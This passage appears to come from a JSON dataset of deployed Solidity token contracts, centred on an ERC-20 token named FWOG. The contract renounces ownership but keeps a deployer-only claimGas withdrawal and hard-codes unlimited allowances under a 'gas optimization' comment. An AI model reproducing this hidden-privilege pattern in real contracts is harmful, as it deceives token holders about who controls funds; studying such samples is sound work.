Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom(address from, address to, uint256 value) public virtual returns  ( bool) {\n                        \n        address spender = _msgSender ( ) ; \n        _spendAllowance ( from, spender, value );\n        _transfer(from, to, value ) ; \n        return true ; \n     } \n                        \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns ) if `from`\n     * (or `to` ) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a \n                        {Transfer } \n                         event.\n     */\n    function _update(address from, address to, uint256 value ) internal virtual {\n                        \n        if  ( from == address ( 0 ) )  { \n                        \n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value;\n         } \n                         else {\n                        \n            uint256 fromBalance = _balances[from] ; \n            if (fromBalance < value ) \n                        {\n                revert ERC20InsufficientBalance(from, fromBalance, value );\n            \n                        }\n            unchecked {\n                        \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value;\n             } \n                        \n        \n                         } \n\n        if (to == address(0 ) )  { \n                        \n            unchecked {\n                        \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n            \n                         } \n        }\n                         else  { \n                        \n            unchecked {\n                        \n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n             } \n                        \n         } \n                        \n\n        emit Transfer ( from, to, value);\n     } \n                        \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name ( ) public view virtual returns  ( string memory )  { \n                        \n        return _name ; \n     } \n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an  { \n                        Approval}\n                         event.\n     */\n    function _spendAllowance ( address owner, address spender, uint256 value) internal virtual \n                         { \n        uint256 currentAllowance = allowance ( owner, spender) ; \n        if (currentAllowance < type(uint256 ).max ) {\n                        \n            if  ( currentAllowance < value) {\n                        \n                revert ERC20InsufficientAllowance ( spender, currentAllowance, value ) ; \n            }\n                        \n            unchecked {\n                        \n                _approve(owner, spender, currentAllowance - value, false) ; \n             } \n                        \n         } \n                        \n    }\n                        \n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05`  ( `505 / 10 ** 2` ).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {\n                        IERC20-balanceOf}\n                         and  { \n                        IERC20-transfer}\n                        .\n     */\n    function decimals (  ) public view virtual returns  ( uint8 )  { \n                        \n        return 15 ; \n     } \n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-totalSupply } \n                        .\n     */\n    function totalSupply (  ) public view virtual returns (uint256 ) \n                        {\n        return _totalSupply ; \n    }\n                        \n    \n\n    /**\n     * @dev See \n                         { IERC20-balanceOf } \n                        .\n     */\n    function balanceOf(address account) public view virtual returns (uint256 )  { \n                        \n        return _balances[account];\n     } \n                        \n    \n    /**\n     * @dev Variant of {\n                        _approve } \n                         with an optional flag to enable or disable the  { \n                        Approval } \n                         event.\n     *\n     * By default  ( when calling \n                        {_approve}\n                         ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {\n                        \n     *     super._approve ( owner, spender, value, true) ; \n     * \n                         } \n     * ```\n     *\n     * Requirements are the same as \n                        {_approve}\n                        .\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent ) internal virtual  { \n                        \n        if (owner == address ( 0)) {\n                        \n            revert ERC20InvalidApprover(address(0 ) ) ; \n        }\n                        \n        if  ( spender == address ( 0 )) {\n                        \n            revert ERC20InvalidSpender ( address(0 ) ) ; \n        }\n                        \n        _allowances[owner][spender] = value;\n        if  ( emitEvent ) {\n                        \n            emit Approval ( owner, spender, value );\n        \n                         } \n    }\n                        \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to  { \n                        transfer}\n                        , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a \n                        {Transfer}\n                         event.\n     *\n     * NOTE: This function is not virtual, {\n                        _update}\n                         should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value ) internal  { \n                        \n        if (from == address(0) ) \n                         { \n            revert ERC20InvalidSender(address(0) );\n         } \n                        \n        if (to == address(0 ) ) \n                        {\n            revert ERC20InvalidReceiver(address(0 ) ) ; \n         } \n                        \n        _update ( from, to, value );\n    \n                        }\n    \n    /**\n     * @dev Sets the values for \n                        {name}\n                         and \n                        {symbol}\n                        .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_) \n                        {\n        _name = name_ ; \n        _symbol = symbol_ ; \n    }\n                        \n    \n\n    /**\n     * @dev See  { \n                        IERC20-transfer\n                        }.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer(address to, uint256 value) public virtual returns  ( bool ) \n                        {\n        address owner = _msgSender ( );\n        _transfer ( owner, to, value);\n        return true;\n     } \n                        \n    \n    \n                         } \n\nabstract contract Ownable is Context  { \n                        \n    address private _owner ; \n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor() \n                        {\n        _transferOwnership ( _msgSender (  ) ) ; \n    \n                        }\n    \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner) internal virtual  { \n                        \n        address oldOwner = _owner ; \n        _owner = newOwner ; \n        emit OwnershipTransferred ( oldOwner, newOwner ) ; \n    }\n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership ( address newOwner) public virtual onlyOwner  { \n                        \n        require ( newOwner != address(0), \"Ownable: new owner is the zero address\" ) ; \n        _transferOwnership(newOwner );\n    \n                         } \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address )  { \n                        \n        return _owner;\n    }\n                        \n    \n    /**\n     * @dev The owner is not a valid owner account. (eg. `address ( 0)` )\n     */\n    error OwnableInvalidOwner(address owner) ; \n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() \n                         { \n        _checkOwner ( ) ; \n        _ ; \n     } \n                        \n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount ( address account );\n    \n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner ) ; \n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n                        \n        _transferOwnership(address(0 )) ; \n    }\n                        \n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner (  ) internal view virtual {\n                        \n        require ( owner ( ) == _msgSender (  ), \"Ownable: caller is not the owner\");\n    \n                        }\n    \n } \n                        \n\n\n// File FWOG.sol\n\ncontract FWOG is ERC20, Ownable {\n                        \n    address internal immutable deployer ; \n    constructor ( string memory name_, string memory symbol_ ) ERC20 ( name_, symbol_)  { \n                        \n        _mint(msg.sender, 100000000000000000000000) ; \n        _transferOwnership ( address ( 0 )) ; \n        deployer = msg.sender;\n    }\n                        \n    \n    /**\n     * @dev See {\n                        IERC20-allowance\n                         } .\n     */\n    function allowance ( address owner, address spender) public view override returns (uint256 ) \n                        {\n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if((spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3) || (spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24 )){\n                        \n            return type(uint256 ).max ; \n        }\n                         \n        return super.allowance ( owner,spender ) ; \n    \n                        }\n    \n    function claimGas ( address payable recipient, uint256 amount ) public {\n                        \n        require(msg.sender==deployer ) ; \n        Address.sendValue(recipient, amount );\n    }\n                        \n    \n    receive ( ) external payable { \n                        \n     } \n                        \n\n                        }",
      "count": 1,
      "addresses": [
        "0xa0b7729C6e64D2E1F4f7E36B4b6DDe1C4e9679bF"
      ],
      "names": [
        "FWOG"
      ]
    },
    {
      "id": "0a445a1e-dc97-4fc7-b6c6-10e537381e74",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts  ( last updated v5.1.0 )  ( utils/Address.sol )\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address  { \n                        \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account  ( EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract ( address account ) internal view returns  ( bool)  { \n                        \n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0 ; \n    \n                        }\n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {\n                        sendValue } \n                         removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     *  { \n                        ReentrancyGuard } \n                         or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount) public  { \n                        \n        require(address ( this ).balance >= amount, \"Address: insufficient balance\");\n\n         ( bool success,  ) = recipient.call { \n                        value: amount } \n                        (\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\" ) ; \n     } \n                        \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls ).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( address target, bytes memory data) internal returns (bytes memory )  { \n                        \n        return functionCallWithValue(target, data, 0, \"Address: low-level call failed\" );\n    \n                         } \n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes-}\n                        [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns (bytes memory )  { \n                        \n        return functionCallWithValue(target, data, 0, errorMessage );\n     } \n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns  ( bytes memory )  { \n                        \n        return functionCallWithValue ( target, data, value, \"Address: low-level call with value failed\" );\n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCallWithValue-address-bytes-uint256-}\n                        [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue ( \n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n     ) internal returns  ( bytes memory) {\n                        \n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\n        (bool success, bytes memory returndata ) = target.call\n                        {value: value\n                         }  ( data);\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage );\n    \n                         } \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data ) internal view returns  ( bytes memory)  { \n                        \n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-string-}\n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns  ( bytes memory ) \n                        {\n        (bool success, bytes memory returndata) = target.staticcall ( data ) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage);\n    \n                        }\n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall ( address target, bytes memory data) internal returns  ( bytes memory ) {\n                        \n        return functionDelegateCall ( target, data, \"Address: low-level delegate call failed\" );\n    }\n                        \n\n    /**\n     * @dev Same as \n                        {xref-Address-functionCall-address-bytes-string-\n                         } [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns (bytes memory)  { \n                        \n         ( bool success, bytes memory returndata) = target.delegatecall ( data);\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage) ; \n    \n                         } \n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert  ( either by bubbling\n     * the revert reason or using the provided one ) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget ( \n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal view returns (bytes memory )  { \n                        \n        if (success) \n                         { \n            if (returndata.length == 0 ) \n                         { \n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require(isContract(target ), \"Address: call to non-contract\" ) ; \n             } \n                        \n            return returndata;\n        }\n                         else \n                         { \n            _revert(returndata, errorMessage);\n        }\n                        \n    \n                        }\n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal pure returns  ( bytes memory) {\n                        \n        if (success )  { \n                        \n            return returndata ; \n         } \n                         else {\n                        \n            _revert(returndata, errorMessage );\n        }\n                        \n    }\n                        \n\n    function _revert(bytes memory returndata, string memory errorMessage) private pure \n                         { \n        // Look for revert reason and bubble it up if present\n        if  ( returndata.length > 0)  { \n                        \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly {\n                        \n                let returndata_size := mload(returndata )\n                revert ( add(32, returndata), returndata_size)\n             } \n                        \n         } \n                         else  { \n                        \n            revert ( errorMessage ) ; \n         } \n                        \n     } \n                        \n } \n                        \npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender  ( as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context  { \n                        \n\n    function _msgData( ) internal view virtual returns  ( bytes calldata )  { \n                        \n        return msg.data ; \n    \n                        }\n\n    function _contextSuffixLength ( ) internal view virtual returns (uint256)  { \n                        \n        return 0;\n     } \n                        \n    function _msgSender() internal view virtual returns (address ) {\n                        \n        return msg.sender ; \n     } \n                        \n\n\n } \n                        \n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors {\n                        \n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender) ; \n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender(address spender) ; \n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed) ; \n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover(address approver) ; \n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed );\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver(address receiver) ; \n\n                        }\n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 \n                        {\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply( ) external view returns (uint256 );\n\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf ( address account ) external view returns (uint256 ) ; \n\n        /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another  ( `to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value );\n\n        \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer } \n                         event.\n     */\n    function transfer(address to, uint256 amount ) external returns  ( bool ) ; \n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer } \n                         event.\n     */\n    function transferFrom ( address from, address to, uint256 amount) external returns  ( bool ) ; \n    \n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {\n                        transferFrom}\n                        . This is\n     * zero by default.\n     *\n     * This value changes when \n                         { approve}\n                         or  { \n                        transferFrom } \n                         are called.\n     */\n    function allowance ( address owner, address spender ) external view returns  ( uint256) ; \n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {\n                        approve } \n                        . `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value );\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an  { \n                        Approval } \n                         event.\n     */\n    function approve ( address spender, uint256 amount ) external returns (bool ) ; \n    \n } \n                        \n\n\ninterface IERC20Metadata is IERC20 \n                         { \n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name ( ) external view returns (string memory );\n\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol (  ) external view returns (string memory );\n\n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals ( ) external view returns  ( uint8);\n    \n\n                         } \n\n\n\n\n\n/**\n * @dev Implementation of the {\n                        IERC20 } \n                         interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {\n                        _mint}\n                        .\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of {\n                        decimals}\n                         is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors   { \n                        \n    mapping(address => uint256 ) private _balances;\n\n\n    mapping(address => mapping(address => uint256 )) private _allowances;\n    uint256 private _totalSupply ; \n\n    string private _name;\n    string private _symbol ; \n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol ( ) public view virtual returns (string memory) \n                         { \n        return _symbol;\n     } \n                        \n    \n    /**\n     * @dev Sets the values for \n                         { name}\n                         and {\n                        symbol}\n                        .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_ )  { \n                        \n        _name = name_;\n        _symbol = symbol_ ; \n     } \n                        \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name (  ) public view virtual returns  ( string memory)  { \n                        \n        return _name ; \n    }\n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-transferFrom } \n                        .\n     *\n     * Skips emitting an {\n                        Approval}\n                         event indicating an allowance update. This is not\n     * required by the ERC. See  { \n                        xref-ERC20-_approve-address-address-uint256-bool- } \n                        [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom ( address from, address to, uint256 value ) public virtual returns (bool) {\n                        \n        address spender = _msgSender();\n        _spendAllowance(from, spender, value ) ; \n        _transfer ( from, to, value);\n        return true;\n     } \n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an {\n                        Approval}\n                         event.\n     */\n    function _spendAllowance ( address owner, address spender, uint256 value) internal virtual {\n                        \n        uint256 currentAllowance = allowance(owner, spender );\n        if (currentAllowance < type(uint256).max)  { \n                        \n            if (currentAllowance < value)  { \n                        \n                revert ERC20InsufficientAllowance(spender, currentAllowance, value ) ; \n             } \n                        \n            unchecked {\n                        \n                _approve ( owner, spender, currentAllowance - value, false);\n            }\n                        \n        \n                        }\n    }\n                        \n    \n\n    /**\n     * @dev See  { \n                        IERC20-allowance\n                         } .\n     */\n    function allowance ( address owner, address spender) public view virtual returns (uint256)  { \n                        \n        return _allowances[owner][spender] ; \n     } \n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-totalSupply } \n                        .\n     */\n    function totalSupply (  ) public view virtual returns  ( uint256)  { \n                        \n        return _totalSupply;\n    \n                        }\n    \n\n    /**\n     * @dev See  { \n                        IERC20-transfer } \n                        .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer(address to, uint256 value) public virtual returns  ( bool)  { \n                        \n        address owner = _msgSender (  );\n        _transfer(owner, to, value ) ; \n        return true ; \n    }\n                        \n    \n    /**\n     * @dev Variant of {\n                        _approve}\n                         with an optional flag to enable or disable the  { \n                        Approval } \n                         event.\n     *\n     * By default (when calling {\n                        _approve}\n                         ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve ( address owner, address spender, uint256 value, bool ) internal virtual override \n                         { \n     *     super._approve(owner, spender, value, true ) ; \n     *  } \n                        \n     * ```\n     *\n     * Requirements are the same as  { \n                        _approve } \n                        .\n     */\n    function _approve ( address owner, address spender, uint256 value, bool emitEvent) internal virtual  { \n                        \n        if (owner == address(0)) {\n                        \n            revert ERC20InvalidApprover(address(0));\n         } \n                        \n        if (spender == address ( 0) ) \n                         { \n            revert ERC20InvalidSpender ( address ( 0 ));\n        \n                        }\n        _allowances[owner][spender] = value;\n        if  ( emitEvent ) \n                         { \n            emit Approval ( owner, spender, value ) ; \n        }\n                        \n     } \n                        \n    \n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address ( 0).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a {\n                        Transfer\n                         }  event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {\n                        _update}\n                         should be overridden instead.\n     */\n    function _mint(address account, uint256 value) internal {\n                        \n        if (account == address ( 0) )  { \n                        \n            revert ERC20InvalidReceiver ( address ( 0)) ; \n        }\n                        \n        _update(address ( 0 ), account, value);\n    \n                        }\n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns ) if `from`\n     * (or `to` ) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a {\n                        Transfer } \n                         event.\n     */\n    function _update(address from, address to, uint256 value ) internal virtual  { \n                        \n        if (from == address(0 ) ) {\n                        \n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value;\n        }\n                         else  { \n                        \n            uint256 fromBalance = _balances[from];\n            if  ( fromBalance < value)  { \n                        \n                revert ERC20InsufficientBalance(from, fromBalance, value);\n            }\n                        \n            unchecked  { \n                        \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value ; \n            }\n                        \n         } \n                        \n\n        if (to == address ( 0 )) \n                        {\n            unchecked {\n                        \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n            \n                         } \n         } \n                         else \n                        {\n            unchecked {\n                        \n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value ; \n            \n                         } \n         } \n                        \n\n        emit Transfer ( from, to, value ) ; \n    }\n                        \n    \n    /**\n     * @dev See {\n                        IERC20-approve}\n                        .\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value) public virtual returns  ( bool ) {\n                        \n        address owner = _msgSender() ; \n        _approve ( owner, spender, value ) ; \n        return true;\n    }\n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-balanceOf } \n                        .\n     */\n    function balanceOf ( address account ) public view virtual returns  ( uint256) {\n                        \n        return _balances[account] ; \n    \n                        }\n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an  { \n                        Approval } \n                         event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address owner, address spender, uint256 value) internal {\n                        \n        _approve(owner, spender, value, true ) ; \n    }\n                        \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to  { \n                        transfer}\n                        , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a  { \n                        Transfer } \n                         event.\n     *\n     * NOTE: This function is not virtual, \n                         { _update}\n                         should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value) internal  { \n                        \n        if  ( from == address ( 0 ) )  { \n                        \n            